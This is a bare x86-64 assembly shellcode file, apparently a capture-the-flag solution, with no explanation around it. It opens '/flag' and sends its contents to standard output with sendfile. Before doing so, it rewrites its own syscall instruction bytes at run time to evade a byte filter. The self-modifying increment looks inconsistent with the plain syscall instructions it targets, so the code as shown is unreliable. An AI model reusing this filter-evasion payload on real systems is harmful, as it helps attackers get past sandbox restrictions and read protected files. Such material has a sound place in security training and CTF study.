.global _start
_start:
.intel_syntax noprefix

lea rax, [rip+syscall1]
mov bl, [rax]
inc bl
mov [rax], bl

lea rax, [rip+syscall2]
mov bl, [rax]
inc bl
mov [rax], bl

# open("/flag", 0) // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall1:
syscall

# sendfile(1, 3, 0, 0x80);
mov rax, 40
mov rdi, 1
mov rsi, 3
mov rdx, 0
mov r10, 0x80
syscall2:
syscall

flag:
.asciz "/flag"
